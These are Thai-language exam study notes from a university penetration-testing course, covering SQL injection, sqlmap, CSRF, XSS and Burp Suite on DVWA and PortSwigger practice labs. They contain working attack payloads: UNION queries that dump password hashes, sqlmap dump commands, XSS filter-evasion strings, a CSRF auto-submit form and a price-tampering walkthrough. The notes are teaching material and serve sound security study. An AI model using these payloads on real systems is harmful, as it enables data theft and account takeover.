#ออกสอบ Final

วิชา Penetration Testing and Protection (0406136051) — DVWA · SQL Injection · sqlmap · CSRF · XSS · Burp Suite

Web Hacking คือการเจาะช่องโหว่ที่ตัว Web Application เอง (ไม่ใช่แค่ port/service เหมือน Lecture ก่อนๆ) เป้าหมายคือข้อมูลใน Database, session ของผู้ใช้ และการยึดควบคุมเว็บไซต์ — คลาสสิกที่ต้องรู้คือ 3 ตัวนี้: SQL Injection (แทรกคำสั่ง SQL), XSS (แทรก script), CSRF (บังคับให้เหยื่อทำ action) ซึ่งล้วนอยู่ใน OWASP Top 10

1. DVWA — สนามซ้อมเว็บที่จงใจทำให้พัง

Damn Vulnerable Web Application (DVWA) คือเว็บแอป PHP/MySQL ที่ถูกออกแบบมาให้มีช่องโหว่โดยเจตนา เพื่อให้ pentester, web developer และ security professional ฝึกโจมตีและเรียนรู้วิธีป้องกันได้จริง ในสภาพแวดล้อมที่ปลอดภัยและถูกกฎหมาย

ขั้นตอน คำสั่ง / รายละเอียด
ติดตั้ง sudo apt install dvwa (หรือใช้ Docker image ตามที่อาจารย์แนะนำ)
เริ่มระบบ dvwa-start
Login เริ่มต้น username admin / password password

1.1 ระดับความปลอดภัย (DVWA Security Levels)

DVWA ให้เลือก 4 ระดับความยาก — จุดสำคัญคือ payload ที่ใช้ได้ในระดับ Low จะใช้ไม่ได้ในระดับ Medium/High ทำให้ได้เรียนรู้เทคนิค bypass ทีละขั้น

ระดับ ความหมาย
Low ค่าเริ่มต้นของ Docker — ไม่มีมาตรการป้องกันใดๆ เลย (vulnerable ที่สุด ใช้เรียนหลักการ)
Medium สาธิต bad security practices — นักพัฒนาพยายามป้องกันแล้วแต่ยังทำไม่ถูกต้อง
High ต่อยอดจาก Medium — ผสมการป้องกันที่ยากขึ้นหรือเป็น "ทางเลือกที่แย่" มีขีดจำกัดการโจมตีคล้ายสนาม CTF
Impossible ปลอดภัยจริง (ค่าเริ่มต้นของ Kali) — ใช้เป็นตัวอย่างว่าการป้องกันที่ถูกต้องเป็นอย่างไร

เมนูด้านซ้ายคือบทเรียน/โจทย์ (lessons/challenges) โดยมีปุ่มสำคัญ 2 ปุ่ม: View Source (ดู PHP source ของหน้านั้นเพื่อวิเคราะห์กลยุทธ์) และ View Help (อธิบายว่าโจมตีทำไมได้ และควรเห็นอะไรเมื่อเปลี่ยนระดับความยาก)

ช่องโหว่ใน DVWA: Brute-force · Command Injection · CSRF · File Inclusion · File Upload · Insecure CAPTCHA · SQL Injection · Blind SQLi · Weak Session IDs · XSS (DOM / Reflected / Stored) · CSP Bypass · JavaScript · Open HTTP Redirect
เครื่องมือที่ใช้คู่กับ DVWA: Nmap (หาบริการก่อน) · Wireshark (ดัก packet) · sqlmap (SQLi อัตโนมัติ) · John the Ripper / Hydra (แคร็ก credential) · Social Engineer Toolkit · Metasploit · Burp Suite (ดัก/แก้ request)

2. SQL Injection — หลักการและการพิสูจน์ช่องโหว่

SQL Injection (SQLi) = ช่องโหว่ที่เปิดให้ attacker แทรกคำสั่ง SQL เข้าไปใน query ของแอปพลิเคชัน ทำให้สามารถดู แก้ไข หรือลบข้อมูลที่ไม่มีสิทธิ์เข้าถึงได้ — รวมถึงข้อมูลของผู้ใช้คนอื่นจาก Database

2.1 Entry Point Detection — หาจุดที่แทรกได้

เมื่อเว็บตอบสนองผิดปกติต่อ input ที่เป็น SQL ขั้นแรกคือ หาวิธี "หนีออก" (escape) จาก context ปัจจุบัน ให้ query ยังทำงานได้ โดยไม่พัง แล้วปิดท้ายด้วย comment symbol เพื่อตัดส่วนที่โค้ดเดิมต่อท้ายอยู่

ตัวอย่าง escape characters ที่ใช้บ่อย: ' · " · ` · ) · ') · ") · `) · ')) · ")) · `))

DBMS Comment Syntax
MySQL #comment · -- comment (ต้องมี space หลัง --) · /*comment*/ · /*! MySQL Special SQL */
PostgreSQL --comment · /*comment*/
MSSQL --comment · /*comment*/
Oracle --comment
SQLite --comment · /*comment*/

2.2 Confirming with Logical Operations — ยืนยันด้วยตรรกะ

  • ทดสอบด้วย tautology: ถ้า ?username=Peter กับ ?username=Peter' or '1'='1 ให้ผลลัพธ์เหมือนกัน → สงสัย SQLi ทันที (เพราะ '1'='1 เป็นจริงเสมอ = คืนทุกแถว)
  • ทดสอบด้วยคณิตศาสตร์: ถ้า ?id=1 กับ ?id=2-1 ให้ผลเหมือนกัน → ยืนยันว่า input ถูกคำนวณเป็น SQL จริง ไม่ใช่ข้อความธรรมดา
หลักคิดสำคัญ: ช่องโหว่นี้เกิดจากโปรแกรมนำ input ของเราไป ต่อเป็นสตริงของ SQL ตรงๆ (string concatenation) — สิ่งที่เราพิมพ์จึงกลายเป็น "โค้ด" ไม่ใช่ "ข้อมูล" ถ้าเขาใช้ Prepared Statement / Parameterized Query ปัญหานี้จะหายไป

2.3 ตัวอย่างจริงบน DVWA (ระดับ Low)

ที่ช่อง User ID กรอก:

  • %' or '0'='0 — โค้ด PHP จะสร้าง query เป็น:
    SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0';
    โดย % เป็น wildcard, '0'='0' เป็น tautology ทำให้ได้ข้อมูลผู้ใช้ทั้ง 5 คน
  • ' or 1=1# หรือ 1' OR '1'='1'# — วิธี tautology แบบสั้น
บทเรียน: ถ้า tautology ผ่านได้ แปลว่า SQL keyword ใดๆ ก็ถูกนำไปรันได้เช่นกัน — ต่อไปคือ "ขอดูข้อมูลจริงจากตารางอื่น"

3. SQL Injection — UNION-Based Injection

UNION เป็นคำสั่ง SQL ที่รวมผลลัพธ์ของ 2 query เข้าด้วยกัน ผู้โจมตีใช้ต่อ query อันตรายของตัวเองเข้าไปกับ query ที่ถูกต้องของเว็บ เพื่อขโมยข้อมูลจากตารางอื่น

เงื่อนไขบังคับของ UNION: ทั้ง 2 query ต้องคืน จำนวนคอลัมน์เท่ากัน (และชนิดข้อมูลเข้ากันได้) — จึงต้องนับคอลัมน์ให้ได้ก่อนเสมอ

3.1 หาจำนวนคอลัมน์ (Detecting Number of Columns)

วิธี ทำอย่างไร
ORDER BY / GROUP BY เพิ่มตัวเลขไปเรื่อยๆ เช่น 1' ORDER BY 1# → 2 → 3… จนกว่า จะ error — จำนวนคอลัมน์จริง = ค่าสุดท้ายที่ยังไม่ error
UNION SELECT NULL ใส่ null เพิ่มทีละตัวจน query ถูกต้อง:
1' UNION SELECT null -- → 1' UNION SELECT null, null --

3.2 ลำดับการโจมตีบน DVWA (Low)

  1. ยืนยันช่องโหว่: %' or '0'='0 (จากข้อ 2.3) แล้วหาจำนวนคอลัมน์ด้วย ORDER BY (query เดิมคืน 2 คอลัมน์: first_name, last_name)
  2. สำรวจโครงสร้าง DB ผ่าน metadata:
    %' UNION SELECT table_name,column_name FROM information_schema.columns #
    หรือดูรายชื่อตารางทั้งหมด: ' union select table_name,null from information_schema.tables#
  3. ขโมย credential ของทุก user:
    %' UNION SELECT user, password FROM users #
    ผลลัพธ์คือ username คู่กับ MD5 hash เช่น admin: 5f4dcc3b5aa765d61d8327deb882cf99, gordonb: e99a18c428cb38d5f260853678922e03, 1337: 8d3533d75ae2c3966d7e0d4fcc69216b
เกร็ด: information_schema คือ metadata ของ MySQL ที่บอกชื่อ database/table/column ทั้งหมด — เป็น "แผนที่สมบัติ" ของ attacker และ hash ที่ได้เป็น MD5 เอาไปแคร็กต่อด้วย John the Ripper หรือ Hashcat ได้ทันที (ดู Lecture 7)

4. SQL Injection — Error-Based และ Blind Injection

4.1 Error-Based Injection

ใช้เมื่อไม่เห็นผลลัพธ์ของ query แต่เห็นข้อความ error — attacker จงใจทำให้เกิด error ที่ฝังข้อมูลจาก DB ไว้ในข้อความ error แล้วอ่านค่าจากตรงนั้น

ลำดับเหตุการณ์ ผู้เกี่ยวข้อง
1. ส่ง malicious input Attacker → Web App
2. สร้าง SQL query ส่งไป Database Web App → Database Server
3. Database ตอบกลับ (หรือเกิด error) Database → Web App
4. แสดง error message ที่ attacker ตีความได้ Web App → Attacker

แนวคิด payload คือบังคับให้ query เกิด duplicate key error โดยเอา data ที่ต้องการ (เช่น version) ไปต่อกับค่าที่ชนกัน เช่นใช้ row(), count(*), concat() ร่วมกับ floor(rand()*2) — ข้อมูลจะโผล่มาในข้อความ error เอง

4.2 Blind Injection — เมื่อมองไม่เห็นผลลัพธ์

Blind SQLi = ดึงข้อมูลไม่ได้ตรงๆ ต้องอนุมานจากพฤติกรรมของระบบ (เหมือนถามคำถาม yes/no ทีละข้อ) มี 2 เทคนิคหลัก:

เทคนิค หลักการ ตัวอย่างบน DVWA
Boolean-based หน้าเว็บเปลี่ยนไปตามผลจริง/เท็จของเงื่อนไข 2' AND 1=1# (จริง — หน้าปกติ) vs 2' AND 1=0# (เท็จ — หน้าเปลี่ยน)
Timing-based วัดเวลาตอบสนอง — ถ้า delay ตามที่สั่ง = คำสั่งถูก execute จริง 2' AND SLEEP(5)# — ถ้าหน้าค้าง ~5 วินาที = vulnerable

ขั้นตอน Blind บน DVWA (จากสไลด์):

  1. Simple test: ใส่ 2'# — ถ้าเกิด error หรือ behavior เปลี่ยน = น่าสงสัย
  2. True/False test: เปรียบเทียบ 2' AND 1=1# กับ 2' AND 1=0#
  3. Timing test: 2' AND SLEEP(5)# เทียบเวลาตอบสนอง
  4. หาจำนวนคอลัมน์: 2' ORDER BY X# เพิ่ม X จน behavior เปลี่ยน — (จากสไลด์: ทดสอบ X=3 แล้ว error → สรุปว่ามี 2 คอลัมน์)
  5. หาความยาวชื่อ Database: 2' AND LENGTH(DATABASE())=X# ไล่ X จนผลเปลี่ยน (สไลด์: เปลี่ยนที่ X=4 → ชื่อ DB ยาว 4 ตัวอักษร)
เกร็ด: Blind SQLi ต้องถามทีละตัวอักษร (เดาความยาว → เดาทีละตัว) — ใช้เวลามาก ดังนั้นในงานจริงมักใช้ sqlmap automate ให้

5. sqlmap — Automate SQL Injection

sqlmap คือเครื่องมือ open source สำหรับ ตรวจจับและโจมตี SQL injection อัตโนมัติ รวมถึงยึดควบคุม database server ความสามารถเด่น:

  • รองรับครบ 6 เทคนิค: boolean-based blind · time-based blind · error-based · UNION query-based · stacked queries · out-of-band
  • ต่อ database ตรงๆ ได้ด้วย credential (ไม่ต้องผ่านช่องโหว่)
  • enumerate ได้ทั้ง users, password hashes, privileges, roles, databases, tables, columns

5.1 เตรียมตัว: หา Session ID (PHPSESSID)

DVWA บังคับ login ก่อนเสมอ — คำสั่ง sqlmap จึงต้องแนบ cookie ไปด้วย: เปิด DevTools (F12) → แท็บ Application (Chrome) หรือ Storage (Firefox) → Cookies → หา PHPSESSID ค่าที่อยู่ข้างๆ คือ session ID ของเรา

5.2 คำสั่งหลัก (จากสไลด์)

ขั้น คำสั่ง
ยิงพื้นฐาน (GET) sqlmap -u "http://<IP>/dvwa/vulnerabilities/sqli_blind/?id=1&Submit=Submit#" --cookie="security=medium;PHPSESSID=<session_id>"
ฟอร์มแบบ POST เพิ่ม --data="id=1&Submit=Submit" -p id ระบุพารามิเตอร์ที่ทดสอบ
ดูรายชื่อ Database ต่อท้ายด้วย --dbs (เช่น -D dvwa เพื่อเจาะจง DB ชื่อ dvwa)
ดูตารางใน DB -D dvwa --tables
ดูคอลัมน์ -D dvwa --tables users --columns
ดึงข้อมูลทั้งหมด -D dvwa --tables users --dump

ตัวอย่างเต็ม:
sqlmap -u "http://192.168.74.129/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="PHPSESSID=<your_session_id>; security=low" -D dvwa --tables

ผลลัพธ์ถูกเก็บที่: /home/kali/.local/share/sqlmap/output/<Target_IP> — เปิดไฟล์ session.sqlite ด้วย sqlitebrowser เพื่อดูผลย้อนหลังได้
เกร็ด: ค่า security= ใน cookie ต้องตรงกับระดับที่ตั้งใน DVWA (เช่น security=medium) ไม่งั้น sqlmap จะยิง payload ที่ไม่ตรงกับระดับความยากจริง

6. CSRF — Cross-Site Request Forgery

CSRF คือช่องโหว่ที่ทำให้ attacker สั่งให้เบราว์เซอร์ของเหยื่อทำ action แทนเหยื่อ โดยอาศัย session ที่เหยื่อล็อกอินค้างไว้ — เกิดเมื่อเหยื่อเยี่ยมชมเว็บอันตราย แล้วเว็บนั้นยิง request ไปยังบัญชีเหยื่อ (ผ่าน JavaScript / form / img) ซึ่งเบราว์เซอร์จะแนบ cookie ของเหยื่อไปให้อัตโนมัติ

เงื่อนไขที่ต้องมี (Prerequisites) รายละเอียด
1. Identified valuable action ต้องมี action ที่คุ้มค่าให้โจมตี เช่น เปลี่ยนรหัสผ่าน อีเมล หรือยกระดับสิทธิ์
2. Session ผ่าน cookie/Basic Auth session ต้องถูกส่งด้วย cookie หรือ HTTP Basic Authentication header เท่านั้น (header อื่นปลอมไม่ได้)
3. ไม่มี unpredictable parameters request ต้องไม่มีค่าสุ่มที่เดาไม่ได้ — token ป้องกัน CSRF ได้เพราะข้อนี้

ตัวอย่างบน DVWA (Low) — เปลี่ยนรหัสผ่านเหยื่อ:

หน้า change password ส่ง GET request ที่มีพารามิเตอร์ครบใน URL: http://<IP>/dvwa/vulnerabilities/csrf/?password_new=kmutnb&password_conf=kmutnb&Change=Change#

  • พารามิเตอร์ 3 ตัว: password_new, password_conf, Change
  • ถ้า attacker ล่อให้เหยื่อคลิก URL นี้ขณะยังล็อกอินอยู่ → รหัสผ่านของเหยื่อถูกเปลี่ยนทันทีโดยไม่รู้ตัว
สังเกต: ใน URL ไม่มี CSRF token เลย — นี่คือสัญญาณของช่องโหว่ และเพราะใช้ GET แค่ฝังรูป/ลิงก์ในหน้าเว็บอันตรายก็เรียกใช้ได้

7. XSS — Cross-Site Scripting

XSS คือเทคนิคที่ attacker แทรก script อันตรายเข้าไปในเว็บเป้าหมาย แล้ว script นั้นถูก execute ที่เบราว์เซอร์ของเหยื่อ — ช่องทางคือ input ที่เว็บไม่ควบคุม เช่น ช่อง comment, username, email

ประเภท กลไก จุดสังเกต
Reflected (RXSS) script มาจาก HTTP request ปัจจุบัน แล้วสะท้อนกลับไปทันที ไม่ถูกเก็บที่เว็บไซต์ · execute เฉพาะฝั่งเหยื่อที่กดลิงก์
Stored (SXSS) script ถูกเก็บไว้ในเว็บไซต์/DB แล้วถูกส่งให้ทุกคนที่เปิดหน้านั้น อันตรายสุด — execute บนเครื่องของผู้ใช้ทุกคนโดยอัตโนมัติ
DOM-based ช่องโหว่อยู่ใน client-side code (JavaScript) ไม่ใช่ฝั่ง server HTTP response ไม่เปลี่ยน — attacker ใช้ DOM objects เช่น document.URL, document.location, document.referrer

7.1 Payload ตามระดับความยากของ DVWA

ประเภท Low Medium (bypass) High (bypass)
Reflected <script>alert("xss")</script> <Script>alert("hack by falcon")</Script> — สลับตัวพิมพ์ใหญ่-เล็กหลบ filter <img src=x onerror=alert("falcon")> — ใช้ event handler แทน tag script
Stored <script>alert(document.domain)</script> <img src=x onerror=alert(document.domain)> <body onload=alert("bingo")>
DOM-based .../xss_d/?default=<script>alert(1)</script> .../xss_d/?default=English#<script>alert(1)</script> แล้ว reload .../xss_d/?default=English#<script>alert(document.cookie)</script> แล้ว reload
เกร็ด: พัฒนาการของ payload ทั้ง 3 ระดับสอนเทคนิค filter evasion: ระดับ Low = payload ตรงๆ · Medium = ใช้อักขระ/ตัวพิมพ์หลบ filter · High = เปลี่ยนกลไกที่ใช้ execute (event handler) — ดูรายละเอียด XSS ใน OWASP Top 10 (2017) A7

8. Burp Suite — เครื่องมือดักและแก้ Request

Burp Suite คือ Web Proxy ยอดนิยมสำหรับ intercept และแก้ไข HTTP request/response ระหว่างที่เบราว์เซอร์คุยกับเว็บ — ใช้จับ request ที่เราต้องการแล้วดัดแปลงก่อนส่งจริง

ขั้นตอนติดตั้ง/ตั้งค่า รายละเอียด
ติดตั้ง (Community) ดาวน์โหลด installer → chmod +x burpsuite_community_linux_v2025_7_2.sh → ./burpsuite_community_linux_v2025_7_2.sh
ติดตั้งผ่าน Kali (ง่ายสุด) sudo apt install burpsuite -y แล้วใช้ Burp's browser ที่ให้มาด้วย
Proxy ใน Firefox ติดตั้งส่วนขยาย FoxyProxy เพื่อเปิด/ปิด proxy สลับกับ Burp ได้เร็ว
ติดตั้ง CA Certificate เปิด http://burp → คลิก CA Certificate มุมขวาบน (ได้ไฟล์ cacert.der) → ไป Browser Settings → View Certificate → Import certificate
ทดสอบ เปิด google ใหม่ตอน Intercept on → request ถูกดักมาที่ Burp · กด Intercept off → หน้าเว็บทำงานต่อ

CA Certificate จำเป็นสำหรับ HTTPS — ถ้าไม่ติดตั้ง Burp จะอ่าน traffic ที่เข้ารหัสไม่ได้ เพราะเบราว์เซอร์จะไม่ยอมรับ certificate ที่ Burp สร้างขึ้นมาแทน

8.1 Workflow หลัก: Intercept → Repeater

  1. เปิด Intercept แล้วทำ action บนเว็บ (เช่นกด add to cart) → request จะถูกดักไว้
  2. ดูรายละเอียด request (พารามิเตอร์ ราคา cookie ฯลฯ) — อาจแก้แล้ว forward ต่อได้ทันที
  3. ถ้าต้องการทดลองซ้ำ: คลิกขวาที่ request → Send to Repeater
  4. ไปแท็บ Repeater → แก้ค่าที่ต้องการ → กด Send → ดู response ด้านขวา
  5. กลับไปหน้าเว็บ → Refresh → ตรวจสอบว่าเว็บยอมรับค่าที่แก้ไปหรือไม่

8.2 Lab: Business Logic Flaw — เปลี่ยนราคาสินค้า (PortSwigger)

สนามทดลองจาก PortSwigger: https://portswigger.net/web-security/logic-flaws/examples — Login ด้วย wiener / peter จะเห็น Store credit $100 และสินค้า Leather Jacket ราคา $1337.00

  1. เปิด view detail ของสินค้า → เปิด Intercept on ใน Burp แล้วกด add to cart
  2. ใน request ที่ดักได้ สังเกตค่า price=133700 (หน่วยเป็น cents) — เข้าใจว่าด้วยราคานี้ เงิน $100 ไม่พอ
  3. กด Intercept off → สินค้าถูกใส่ตะกร้า → ไป checkout → place order จะเห็นว่าเงินไม่พอ
  4. กด remove สินค้าออก แล้วไปที่ request ใน Burp → คลิกขวา → Send to Repeater
  5. ใน Repeater แก้ price ให้เหลือ เช่น 1300 แล้วกด Send
  6. กลับไปหน้าเว็บ → Refresh → ราคาเหลือ $13.00 → place order สำเร็จ
นี่คือ Business Logic Flaw: ไม่ใช่ bug ทางเทคนิค แต่เป็น "ตรรกะธุรกิจที่เชื่อ client เกินไป" — server รับราคาที่ client ส่งมาโดยไม่ตรวจสอบซ้ำ นี่คือเหตุผลที่ต้องเข้าใจ Burp Suite เพราะเราเห็นและแก้ทุกค่าที่ส่งไปได้

9.1 SQL Injection Labs

โจทย์ วิธีแก้ (ใช้ Burp intercept + แก้พารามิเตอร์)
Retrieving hidden data แก้ category เป็น '+OR+1=1-- → เห็นสินค้าที่ยังไม่ปล่อยขาย (unreleased)

9.2 XSS Labs

  • Reflected XSS (nothing encoded): ยิงในช่องค้นหา → <script>alert("My Script!")</script>
  • Stored XSS (nothing encoded): ส่ง comment ที่มี alert → script ทำงานเมื่อมีคนเปิดโพสต์
  • DOM XSS (document.write sink + location.search): ใช้ payload "><svg onload=alert(1)>

9.3 CSRF Lab — เปลี่ยนอีเมลเหยื่อ (no defenses)

Login wiener:peter → ส่งฟอร์ม Update email → หา request ใน Proxy history → copy URL แล้วสร้างหน้า exploit:

<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
<input type="hidden" name="email" value="evil@hacker.net">
</form>
<script>document.forms[0].submit();</script>

  1. ไปที่ exploit server → วาง HTML ด้านบนในส่วน Body → กด Store
  2. ทดสอบกับตัวเองก่อน: View exploit → ตรวจ request/response ที่ได้
  3. เปลี่ยนอีเมลใน exploit ให้ไม่ใช่ของตัวเอง แล้วกด Deliver to victim → ผ่าน lab

10. สรุปภาระงานที่ต้องส่ง (Exercises & Evidence)

  • Exercise — XSS Reflected: พิมพ์ <script>alert("This is my XSS script running!")</script> ลงใน textbox แล้วกด submit → แคปภาพตอน alert ทำงาน
  • Exercise — XSS Stored: กด sign guestbook → ใส่ script ลงใน message (จะถูกเก็บลง database) → กลับไปหน้าแรก → เลือกเมนู XSS stored → เห็น alert ทำงานเอง (ยืนยันว่า script ถูกเก็บจริงและทำงานกับทุกคน)
  • Exercise — CSRF: สร้างรหัสผ่านใหม่ "123" แล้วกด Change → สังเกตใน URL ว่าขาด CSRF token → อธิบายว่าทำไม attacker จึงล่อให้เหยื่อคลิกได้
  • หลักฐาน: แคปเจอร์ภาพทุกข้อ (payload + ผลลัพธ์) พร้อมระบุระดับ security level ที่ใช้
สรุปแนวคิดเดียวของทั้งบท: Web Hacking = ทำให้ input ของเรา ถูกตีความเป็น "โค้ด" แทน "ข้อมูล" ไม่ว่าจะเป็น SQL (SQLi), JavaScript (XSS), หรือ การใช้ session แทนเจ้าของ (CSRF) — การป้องกันจึงเน้น validate/encode input และบังคับใช้ token ที่เดาไม่ได้
